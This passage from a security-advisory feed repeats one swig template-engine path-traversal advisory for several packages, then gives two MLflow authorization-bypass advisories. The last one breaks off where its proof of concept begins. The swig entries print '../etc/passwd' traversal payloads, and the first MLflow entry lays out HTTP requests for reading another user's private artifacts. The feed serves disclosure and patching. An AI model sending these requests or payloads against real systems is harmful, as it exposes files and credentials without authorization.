<pre><code>{# page.html — trusted template #}
{% include partial %}
</code></pre>
<p>Setting <code>?partial=../../../../etc/passwd</code> makes the loader resolve and read that file, and its contents are rendered into the response. A literal in trusted source is equally affected: <code>{% include "../../../etc/passwd" %}</code>.</p>
<h3 id="impact">Impact</h3>
<p>Arbitrary local file disclosure (confidentiality). An attacker able to influence an include / extends / import path — directly, or via untrusted <code>locals</code> — can read files outside the template directory: application configuration, credentials, source code, <code>/etc/passwd</code>, and so on. There is no integrity or availability impact.</p>
<h3 id="affected--patched">Affected &amp; patched</h3>
<p>Every published version up to and including <code>2.7.0</code> is affected — <code>@rhinostone/swig</code>, and the shared <code>@rhinostone/swig-core</code> loader, hence <code>@rhinostone/swig-twig</code>, <code>@rhinostone/swig-jinja2</code>, and <code>@rhinostone/swig-django</code> as well.</p>
<p>Fixed in <strong><code>2.7.1</code></strong>: the filesystem loader now rejects any <code>include</code> / <code>extends</code> / <code>import</code> path that resolves outside the configured <code>basepath</code> root, including paths supplied through an untrusted runtime variable. A new <code>allowOutsideRoot</code> loader option is available for the rare case of intentionally reading files from outside the root.</p>
<p><strong>Upgrade to <code>2.7.2</code> or later:</strong> <code>2.7.1</code> fixed the vulnerability but introduced a regression — a <em>relative</em> <code>basepath</code> wrongly rejected every in-root template path. <code>2.7.2</code> resolves the <code>basepath</code> to an absolute path before the check and restores correct in-root resolution.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Upgrade to <code>2.7.2</code> (or later).</li>
<li>If you cannot upgrade immediately: configure the filesystem loader with an explicit <code>basepath</code>, and never pass untrusted data into an <code>{% include %}</code> / <code>{% extends %}</code> / <code>{% import %}</code> path.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>GHSA-2rq5-699j-x7p6 — <a href="https://github.com/advisories/GHSA-2rq5-699j-x7p6">https://github.com/advisories/GHSA-2rq5-699j-x7p6</a></li>
<li>CVE-2023-25345 (NVD) — <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25345">https://nvd.nist.gov/vuln/detail/CVE-2023-25345</a></li>
<li>Upstream issue (swig-templates) — <a href="https://github.com/node-swig/swig-templates/issues/88">https://github.com/node-swig/swig-templates/issues/88</a></li>
<li>Fix commit — <a href="https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc">https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/gina-io/swig/security/advisories/GHSA-2mf3-mr2r-r4vf">https://github.com/gina-io/swig/security/advisories/GHSA-2mf3-mr2r-r4vf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25345">https://nvd.nist.gov/vuln/detail/CVE-2023-25345</a></li>
<li><a href="https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc">https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc</a></li>
<li><a href="https://github.com/advisories/GHSA-2mf3-mr2r-r4vf">https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-18T16:31:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@rhinostone/swig-jinja2] @rhinostone/swig: arbitrary local file read via include/extends path traversal]]></title>
        <id>https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</id>
        <link href="https://github.com/advisories/GHSA-2mf3-mr2r-r4vf"/>
        <updated>2026-08-18T16:31:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="overview">Overview</h3>
<p><code>@rhinostone/swig</code> is a maintained fork of the abandoned <code>swig</code> template engine and inherited the directory-traversal vulnerability tracked upstream as CVE-2023-25345 / GHSA-2rq5-699j-x7p6. The <code>{% include %}</code>, <code>{% extends %}</code>, and <code>{% import %}</code> tags resolve their target path through the filesystem loader without confining the result to the configured template root. A path that traverses upward (<code>../</code>) escapes the root and reads an arbitrary file from the host filesystem, whose contents are emitted into the rendered output.</p>
<h3 id="attack-scenario">Attack scenario</h3>
<p>The dangerous case does <strong>not</strong> require the attacker to control template source — only template <strong>data</strong> (the <code>locals</code> passed at render time). An application that renders a trusted template whose include / extends path is variable-driven is exposed:</p>
<pre><code class="language-js">// application code — a configured filesystem loader with a basepath
swig.renderFile('page.html', { partial: req.query.partial });
</code></pre>
<pre><code>{# page.html — trusted template #}
{% include partial %}
</code></pre>
<p>Setting <code>?partial=../../../../etc/passwd</code> makes the loader resolve and read that file, and its contents are rendered into the response. A literal in trusted source is equally affected: <code>{% include "../../../etc/passwd" %}</code>.</p>
<h3 id="impact">Impact</h3>
<p>Arbitrary local file disclosure (confidentiality). An attacker able to influence an include / extends / import path — directly, or via untrusted <code>locals</code> — can read files outside the template directory: application configuration, credentials, source code, <code>/etc/passwd</code>, and so on. There is no integrity or availability impact.</p>
<h3 id="affected--patched">Affected &amp; patched</h3>
<p>Every published version up to and including <code>2.7.0</code> is affected — <code>@rhinostone/swig</code>, and the shared <code>@rhinostone/swig-core</code> loader, hence <code>@rhinostone/swig-twig</code>, <code>@rhinostone/swig-jinja2</code>, and <code>@rhinostone/swig-django</code> as well.</p>
<p>Fixed in <strong><code>2.7.1</code></strong>: the filesystem loader now rejects any <code>include</code> / <code>extends</code> / <code>import</code> path that resolves outside the configured <code>basepath</code> root, including paths supplied through an untrusted runtime variable. A new <code>allowOutsideRoot</code> loader option is available for the rare case of intentionally reading files from outside the root.</p>
<p><strong>Upgrade to <code>2.7.2</code> or later:</strong> <code>2.7.1</code> fixed the vulnerability but introduced a regression — a <em>relative</em> <code>basepath</code> wrongly rejected every in-root template path. <code>2.7.2</code> resolves the <code>basepath</code> to an absolute path before the check and restores correct in-root resolution.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Upgrade to <code>2.7.2</code> (or later).</li>
<li>If you cannot upgrade immediately: configure the filesystem loader with an explicit <code>basepath</code>, and never pass untrusted data into an <code>{% include %}</code> / <code>{% extends %}</code> / <code>{% import %}</code> path.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>GHSA-2rq5-699j-x7p6 — <a href="https://github.com/advisories/GHSA-2rq5-699j-x7p6">https://github.com/advisories/GHSA-2rq5-699j-x7p6</a></li>
<li>CVE-2023-25345 (NVD) — <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25345">https://nvd.nist.gov/vuln/detail/CVE-2023-25345</a></li>
<li>Upstream issue (swig-templates) — <a href="https://github.com/node-swig/swig-templates/issues/88">https://github.com/node-swig/swig-templates/issues/88</a></li>
<li>Fix commit — <a href="https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc">https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/gina-io/swig/security/advisories/GHSA-2mf3-mr2r-r4vf">https://github.com/gina-io/swig/security/advisories/GHSA-2mf3-mr2r-r4vf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25345">https://nvd.nist.gov/vuln/detail/CVE-2023-25345</a></li>
<li><a href="https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc">https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc</a></li>
<li><a href="https://github.com/advisories/GHSA-2mf3-mr2r-r4vf">https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-18T16:31:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@rhinostone/swig-twig] @rhinostone/swig: arbitrary local file read via include/extends path traversal]]></title>
        <id>https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</id>
        <link href="https://github.com/advisories/GHSA-2mf3-mr2r-r4vf"/>
        <updated>2026-08-18T16:31:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="overview">Overview</h3>
<p><code>@rhinostone/swig</code> is a maintained fork of the abandoned <code>swig</code> template engine and inherited the directory-traversal vulnerability tracked upstream as CVE-2023-25345 / GHSA-2rq5-699j-x7p6. The <code>{% include %}</code>, <code>{% extends %}</code>, and <code>{% import %}</code> tags resolve their target path through the filesystem loader without confining the result to the configured template root. A path that traverses upward (<code>../</code>) escapes the root and reads an arbitrary file from the host filesystem, whose contents are emitted into the rendered output.</p>
<h3 id="attack-scenario">Attack scenario</h3>
<p>The dangerous case does <strong>not</strong> require the attacker to control template source — only template <strong>data</strong> (the <code>locals</code> passed at render time). An application that renders a trusted template whose include / extends path is variable-driven is exposed:</p>
<pre><code class="language-js">// application code — a configured filesystem loader with a basepath
swig.renderFile('page.html', { partial: req.query.partial });
</code></pre>
<pre><code>{# page.html — trusted template #}
{% include partial %}
</code></pre>
<p>Setting <code>?partial=../../../../etc/passwd</code> makes the loader resolve and read that file, and its contents are rendered into the response. A literal in trusted source is equally affected: <code>{% include "../../../etc/passwd" %}</code>.</p>
<h3 id="impact">Impact</h3>
<p>Arbitrary local file disclosure (confidentiality). An attacker able to influence an include / extends / import path — directly, or via untrusted <code>locals</code> — can read files outside the template directory: application configuration, credentials, source code, <code>/etc/passwd</code>, and so on. There is no integrity or availability impact.</p>
<h3 id="affected--patched">Affected &amp; patched</h3>
<p>Every published version up to and including <code>2.7.0</code> is affected — <code>@rhinostone/swig</code>, and the shared <code>@rhinostone/swig-core</code> loader, hence <code>@rhinostone/swig-twig</code>, <code>@rhinostone/swig-jinja2</code>, and <code>@rhinostone/swig-django</code> as well.</p>
<p>Fixed in <strong><code>2.7.1</code></strong>: the filesystem loader now rejects any <code>include</code> / <code>extends</code> / <code>import</code> path that resolves outside the configured <code>basepath</code> root, including paths supplied through an untrusted runtime variable. A new <code>allowOutsideRoot</code> loader option is available for the rare case of intentionally reading files from outside the root.</p>
<p><strong>Upgrade to <code>2.7.2</code> or later:</strong> <code>2.7.1</code> fixed the vulnerability but introduced a regression — a <em>relative</em> <code>basepath</code> wrongly rejected every in-root template path. <code>2.7.2</code> resolves the <code>basepath</code> to an absolute path before the check and restores correct in-root resolution.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Upgrade to <code>2.7.2</code> (or later).</li>
<li>If you cannot upgrade immediately: configure the filesystem loader with an explicit <code>basepath</code>, and never pass untrusted data into an <code>{% include %}</code> / <code>{% extends %}</code> / <code>{% import %}</code> path.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>GHSA-2rq5-699j-x7p6 — <a href="https://github.com/advisories/GHSA-2rq5-699j-x7p6">https://github.com/advisories/GHSA-2rq5-699j-x7p6</a></li>
<li>CVE-2023-25345 (NVD) — <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25345">https://nvd.nist.gov/vuln/detail/CVE-2023-25345</a></li>
<li>Upstream issue (swig-templates) — <a href="https://github.com/node-swig/swig-templates/issues/88">https://github.com/node-swig/swig-templates/issues/88</a></li>
<li>Fix commit — <a href="https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc">https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/gina-io/swig/security/advisories/GHSA-2mf3-mr2r-r4vf">https://github.com/gina-io/swig/security/advisories/GHSA-2mf3-mr2r-r4vf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25345">https://nvd.nist.gov/vuln/detail/CVE-2023-25345</a></li>
<li><a href="https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc">https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc</a></li>
<li><a href="https://github.com/advisories/GHSA-2mf3-mr2r-r4vf">https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-18T16:31:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@rhinostone/swig-core] @rhinostone/swig: arbitrary local file read via include/extends path traversal]]></title>
        <id>https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</id>
        <link href="https://github.com/advisories/GHSA-2mf3-mr2r-r4vf"/>
        <updated>2026-08-18T16:31:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="overview">Overview</h3>
<p><code>@rhinostone/swig</code> is a maintained fork of the abandoned <code>swig</code> template engine and inherited the directory-traversal vulnerability tracked upstream as CVE-2023-25345 / GHSA-2rq5-699j-x7p6. The <code>{% include %}</code>, <code>{% extends %}</code>, and <code>{% import %}</code> tags resolve their target path through the filesystem loader without confining the result to the configured template root. A path that traverses upward (<code>../</code>) escapes the root and reads an arbitrary file from the host filesystem, whose contents are emitted into the rendered output.</p>
<h3 id="attack-scenario">Attack scenario</h3>
<p>The dangerous case does <strong>not</strong> require the attacker to control template source — only template <strong>data</strong> (the <code>locals</code> passed at render time). An application that renders a trusted template whose include / extends path is variable-driven is exposed:</p>
<pre><code class="language-js">// application code — a configured filesystem loader with a basepath
swig.renderFile('page.html', { partial: req.query.partial });
</code></pre>
<pre><code>{# page.html — trusted template #}
{% include partial %}
</code></pre>
<p>Setting <code>?partial=../../../../etc/passwd</code> makes the loader resolve and read that file, and its contents are rendered into the response. A literal in trusted source is equally affected: <code>{% include "../../../etc/passwd" %}</code>.</p>
<h3 id="impact">Impact</h3>
<p>Arbitrary local file disclosure (confidentiality). An attacker able to influence an include / extends / import path — directly, or via untrusted <code>locals</code> — can read files outside the template directory: application configuration, credentials, source code, <code>/etc/passwd</code>, and so on. There is no integrity or availability impact.</p>
<h3 id="affected--patched">Affected &amp; patched</h3>
<p>Every published version up to and including <code>2.7.0</code> is affected — <code>@rhinostone/swig</code>, and the shared <code>@rhinostone/swig-core</code> loader, hence <code>@rhinostone/swig-twig</code>, <code>@rhinostone/swig-jinja2</code>, and <code>@rhinostone/swig-django</code> as well.</p>
<p>Fixed in <strong><code>2.7.1</code></strong>: the filesystem loader now rejects any <code>include</code> / <code>extends</code> / <code>import</code> path that resolves outside the configured <code>basepath</code> root, including paths supplied through an untrusted runtime variable. A new <code>allowOutsideRoot</code> loader option is available for the rare case of intentionally reading files from outside the root.</p>
<p><strong>Upgrade to <code>2.7.2</code> or later:</strong> <code>2.7.1</code> fixed the vulnerability but introduced a regression — a <em>relative</em> <code>basepath</code> wrongly rejected every in-root template path. <code>2.7.2</code> resolves the <code>basepath</code> to an absolute path before the check and restores correct in-root resolution.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Upgrade to <code>2.7.2</code> (or later).</li>
<li>If you cannot upgrade immediately: configure the filesystem loader with an explicit <code>basepath</code>, and never pass untrusted data into an <code>{% include %}</code> / <code>{% extends %}</code> / <code>{% import %}</code> path.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>GHSA-2rq5-699j-x7p6 — <a href="https://github.com/advisories/GHSA-2rq5-699j-x7p6">https://github.com/advisories/GHSA-2rq5-699j-x7p6</a></li>
<li>CVE-2023-25345 (NVD) — <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25345">https://nvd.nist.gov/vuln/detail/CVE-2023-25345</a></li>
<li>Upstream issue (swig-templates) — <a href="https://github.com/node-swig/swig-templates/issues/88">https://github.com/node-swig/swig-templates/issues/88</a></li>
<li>Fix commit — <a href="https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc">https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/gina-io/swig/security/advisories/GHSA-2mf3-mr2r-r4vf">https://github.com/gina-io/swig/security/advisories/GHSA-2mf3-mr2r-r4vf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25345">https://nvd.nist.gov/vuln/detail/CVE-2023-25345</a></li>
<li><a href="https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc">https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc</a></li>
<li><a href="https://github.com/advisories/GHSA-2mf3-mr2r-r4vf">https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-18T16:31:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@rhinostone/swig] @rhinostone/swig: arbitrary local file read via include/extends path traversal]]></title>
        <id>https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</id>
        <link href="https://github.com/advisories/GHSA-2mf3-mr2r-r4vf"/>
        <updated>2026-08-18T16:31:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="overview">Overview</h3>
<p><code>@rhinostone/swig</code> is a maintained fork of the abandoned <code>swig</code> template engine and inherited the directory-traversal vulnerability tracked upstream as CVE-2023-25345 / GHSA-2rq5-699j-x7p6. The <code>{% include %}</code>, <code>{% extends %}</code>, and <code>{% import %}</code> tags resolve their target path through the filesystem loader without confining the result to the configured template root. A path that traverses upward (<code>../</code>) escapes the root and reads an arbitrary file from the host filesystem, whose contents are emitted into the rendered output.</p>
<h3 id="attack-scenario">Attack scenario</h3>
<p>The dangerous case does <strong>not</strong> require the attacker to control template source — only template <strong>data</strong> (the <code>locals</code> passed at render time). An application that renders a trusted template whose include / extends path is variable-driven is exposed:</p>
<pre><code class="language-js">// application code — a configured filesystem loader with a basepath
swig.renderFile('page.html', { partial: req.query.partial });
</code></pre>
<pre><code>{# page.html — trusted template #}
{% include partial %}
</code></pre>
<p>Setting <code>?partial=../../../../etc/passwd</code> makes the loader resolve and read that file, and its contents are rendered into the response. A literal in trusted source is equally affected: <code>{% include "../../../etc/passwd" %}</code>.</p>
<h3 id="impact">Impact</h3>
<p>Arbitrary local file disclosure (confidentiality). An attacker able to influence an include / extends / import path — directly, or via untrusted <code>locals</code> — can read files outside the template directory: application configuration, credentials, source code, <code>/etc/passwd</code>, and so on. There is no integrity or availability impact.</p>
<h3 id="affected--patched">Affected &amp; patched</h3>
<p>Every published version up to and including <code>2.7.0</code> is affected — <code>@rhinostone/swig</code>, and the shared <code>@rhinostone/swig-core</code> loader, hence <code>@rhinostone/swig-twig</code>, <code>@rhinostone/swig-jinja2</code>, and <code>@rhinostone/swig-django</code> as well.</p>
<p>Fixed in <strong><code>2.7.1</code></strong>: the filesystem loader now rejects any <code>include</code> / <code>extends</code> / <code>import</code> path that resolves outside the configured <code>basepath</code> root, including paths supplied through an untrusted runtime variable. A new <code>allowOutsideRoot</code> loader option is available for the rare case of intentionally reading files from outside the root.</p>
<p><strong>Upgrade to <code>2.7.2</code> or later:</strong> <code>2.7.1</code> fixed the vulnerability but introduced a regression — a <em>relative</em> <code>basepath</code> wrongly rejected every in-root template path. <code>2.7.2</code> resolves the <code>basepath</code> to an absolute path before the check and restores correct in-root resolution.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Upgrade to <code>2.7.2</code> (or later).</li>
<li>If you cannot upgrade immediately: configure the filesystem loader with an explicit <code>basepath</code>, and never pass untrusted data into an <code>{% include %}</code> / <code>{% extends %}</code> / <code>{% import %}</code> path.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>GHSA-2rq5-699j-x7p6 — <a href="https://github.com/advisories/GHSA-2rq5-699j-x7p6">https://github.com/advisories/GHSA-2rq5-699j-x7p6</a></li>
<li>CVE-2023-25345 (NVD) — <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25345">https://nvd.nist.gov/vuln/detail/CVE-2023-25345</a></li>
<li>Upstream issue (swig-templates) — <a href="https://github.com/node-swig/swig-templates/issues/88">https://github.com/node-swig/swig-templates/issues/88</a></li>
<li>Fix commit — <a href="https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc">https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/gina-io/swig/security/advisories/GHSA-2mf3-mr2r-r4vf">https://github.com/gina-io/swig/security/advisories/GHSA-2mf3-mr2r-r4vf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25345">https://nvd.nist.gov/vuln/detail/CVE-2023-25345</a></li>
<li><a href="https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc">https://github.com/gina-io/swig/commit/381bdc305e0b10e45368d56324328b9b4f7017fc</a></li>
<li><a href="https://github.com/advisories/GHSA-2mf3-mr2r-r4vf">https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-18T16:31:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLflow: CreateModelVersion source validation does not check READ permission on referenced run_id]]></title>
        <id>https://github.com/advisories/GHSA-gqch-g4w5-7qcw</id>
        <link href="https://github.com/advisories/GHSA-gqch-g4w5-7qcw"/>
        <updated>2026-08-17T21:59:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>_validate_source_run</code> and <code>_validate_source_model</code> functions in <code>mlflow/server/handlers.py</code> verify that a model version source path is within the artifact directory of a specified run or logged model, but do not check whether the caller has READ permission on that run or model. An authenticated MLflow user can therefore reference another user's run_id in <code>CreateModelVersion</code>, creating a model version whose artifact URI points at the victim's artifact directory. If the calling user has MANAGE permission on the registered model (which they do after creation), they can then read arbitrary files from the victim's artifact directory via <code>GET /model-versions/get-artifact</code>, bypassing the experiment-level READ permission gate on <code>GET /get-artifact</code>.</p>
<h3 id="details">Details</h3>
<p><code>POST /api/2.0/mlflow/model-versions/create</code> is protected: the caller must have UPDATE permission on the registered model. However, the source/run_id validation performed inside <code>_validate_source_run</code> only verifies path containment, not caller authorization:</p>
<pre><code class="language-python"># mlflow/server/handlers.py  _validate_source_run()
def _validate_source_run(source: str, run_id: str) -&gt; None:
    if is_local_uri(source):
        if run_id:
            store = _get_tracking_store()
            run = store.get_run(run_id)          # &lt;-- no permission check on run_id
            source = pathlib.Path(local_file_uri_to_path(source)).resolve()
            if is_local_uri(run.info.artifact_uri):
                run_artifact_dir = pathlib.Path(...).resolve()
                if run_artifact_dir in [source, *source.parents]:
                    return                       # validation passes
        raise MlflowException(...)
</code></pre>
<p>After creation, the model version's <code>source</code> and <code>run_id</code> point at the victim's artifact directory. The caller can read files from that directory via the model version artifact handler, which derives the artifact path from the stored <code>source</code>:</p>
<pre><code>GET /model-versions/get-artifact?name=&lt;model&gt;&amp;version=&lt;v&gt;&amp;path=&lt;file&gt;
</code></pre>
<p>This bypass matters in deployments where experiment-level permissions are explicitly restricted -- i.e., where the default_permission is NO_PERMISSIONS or the target experiment has no grant for the attacker. Without the bypass, <code>GET /get-artifact</code> for the victim's run would return 403; via the model version artifact handler it returns 200.</p>
<h3 id="poc">PoC</h3>
<p>Prerequisites: MLflow v3.13.0, <code>--app-name basic-auth</code>, default_permission=NO_PERMISSIONS (or alice's experiment restricted). Alice owns experiment 2 and run ALICE_RUN_ID. Bob owns experiment 4. Bob has READ on his own resources but NOT on alice's experiment.</p>
<ol>
<li>Alice uploads a private file:</li>
</ol>
<pre><code class="language-bash"># file is at /mlruns/2/ALICE_RUN_ID/artifacts/secret_weights.txt
echo "ALICE_SECRET_MODEL_WEIGHTS=0.42" &gt; secret_weights.txt
</code></pre>
<ol start="2">
<li>Bob directly tries to read alice's artifact -- blocked:</li>
</ol>
<pre><code>GET /get-artifact?run_id=ALICE_RUN_ID&amp;path=secret_weights.txt HTTP/1.1
Authorization: Basic &lt;bob credentials&gt;
</code></pre>
<p>Response: HTTP 403 (when alice's experiment is private)</p>
<ol start="3">
<li>Bob creates a model version referencing alice's run_id as source anchor:</li>
</ol>
<pre><code>POST /api/2.0/mlflow/model-versions/create HTTP/1.1
Authorization: Basic &lt;bob credentials&gt;
Content-Type: application/json

{"name":"bob-model","source":"/mlruns/2/ALICE_RUN_ID/artifacts","run_id":"ALICE_RUN_ID"}
</code></pre>
<p>Response: HTTP 200</p>
<pre><code class="language-json">{"model_version":{"name":"bob-model","version":"1","source":"/mlruns/2/ALICE_RUN_ID/artifacts","run_id":"ALICE_RUN_ID"}}
</code></pre>
<ol start="4">
<li>Bob reads alice's private file via the model version artifact handler:</li>
</ol>
<pre><code>GET /model-versions/get-artifact?name=bob-model&amp;version=1&amp;path=secret_weights.txt HTTP/1.1
Authorization: Basic &lt;bob credentials&gt;
</code></pre>
<p>Response: HTTP 200 -- body contains <code>ALICE_SECRET_MODEL_WEIGHTS=0.42</code></p>
<p>Live-validated on v3.13.0 with default_permission=READ (the file download is confirmed 200 OK); impact escalates to a true bypass when default_permission=NO_PERMISSIONS.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated user who can create registered models can read arbitrary files from any other user's artifact directory, bypassing the experiment-level READ permission gate. Model weights, training data samples, and evaluation reports stored in a run's artifact directory are accessible. The attacker needs UPDATE (or MANAGE) permission on at least one registered model; with default_permission=READ, that is automatically granted to the model creator.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mlflow/mlflow/security/advisories/GHSA-gqch-g4w5-7qcw">https://github.com/mlflow/mlflow/security/advisories/GHSA-gqch-g4w5-7qcw</a></li>
<li><a href="https://github.com/mlflow/mlflow/pull/24293">https://github.com/mlflow/mlflow/pull/24293</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/4bb7474771c3be808cd9e129defef9305f2869be">https://github.com/mlflow/mlflow/commit/4bb7474771c3be808cd9e129defef9305f2869be</a></li>
<li><a href="https://github.com/mlflow/mlflow/releases/tag/v3.15.0">https://github.com/mlflow/mlflow/releases/tag/v3.15.0</a></li>
<li><a href="https://github.com/advisories/GHSA-gqch-g4w5-7qcw">https://github.com/advisories/GHSA-gqch-g4w5-7qcw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gqch-g4w5-7qcw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-17T21:59:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLflow: LogInputs endpoint bypasses per-run UPDATE authorization in basic-auth]]></title>
        <id>https://github.com/advisories/GHSA-3p64-6gvh-82v5</id>
        <link href="https://github.com/advisories/GHSA-3p64-6gvh-82v5"/>
        <updated>2026-08-17T21:59:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When MLflow is deployed with the built-in basic-auth plugin (<code>--app-name basic-auth</code>), any authenticated user can inject arbitrary dataset records into another user's run by calling <code>POST /api/2.0/mlflow/runs/log-inputs</code>. The <code>LogInputs</code> proto handler is absent from the <code>BEFORE_REQUEST_HANDLERS</code> map in <code>mlflow/server/auth/__init__.py</code>, so the before-request hook skips authorization entirely and the request succeeds. Standard write endpoints on the same run -- such as <code>POST /api/2.0/mlflow/runs/log-metric</code> -- correctly return HTTP 403.</p>
<h3 id="details">Details</h3>
<p>MLflow's basic-auth app gates every HTTP handler through a before-request hook (<code>_before_request</code>) that looks up the relevant permission validator in <code>BEFORE_REQUEST_VALIDATORS</code>. Validators are built from the <code>BEFORE_REQUEST_HANDLERS</code> dictionary, which maps each protobuf request class to a callable. When a class is absent from the dict (or mapped to <code>None</code>), <code>get_before_request_handler</code> returns <code>None</code>, and the resulting entry in <code>BEFORE_REQUEST_VALIDATORS</code> is <code>(path, method): None</code>.</p>
<p>Inside <code>_before_request</code>:</p>
<pre><code class="language-python"># mlflow/server/auth/__init__.py  _before_request()
if validator := _find_validator(request):   # None is falsy -- branch skipped
    if not validator():
        return make_forbidden_response()
elif _is_proxy_artifact_path(request.path):  # not a proxy path
    ...
# falls through: any authenticated request is allowed
</code></pre>
<p>The <code>LogInputs</code> protobuf class is not present in <code>BEFORE_REQUEST_HANDLERS</code>:</p>
<pre><code class="language-python"># mlflow/server/auth/__init__.py  BEFORE_REQUEST_HANDLERS dict
# LogInputs is absent; all run-write operations below ARE present:
LogBatch: validate_can_update_run,
LogMetric: validate_can_update_run,
SetTag:    validate_can_update_run,
LogParam:  validate_can_update_run,
# LogInputs: &lt;missing&gt;
</code></pre>
<p>The route <code>/api/2.0/mlflow/runs/log-inputs</code> (and the identical <code>/ajax-api/</code> variant) therefore admits any valid credential, regardless of which experiment or run is targeted. The <code>LogInputs</code> handler writes <code>DatasetInput</code> records directly to the run's lineage table without any ownership check.</p>
<h3 id="poc">PoC</h3>
<p>Prerequisites: MLflow v3.13.0 running with <code>--app-name basic-auth</code>. Two accounts: alice (creates experiment 2 and run A) and bob (creates experiment 4 and run B).</p>
<ol>
<li>Confirm the authorized endpoint correctly denies alice's write to bob's run:</li>
</ol>
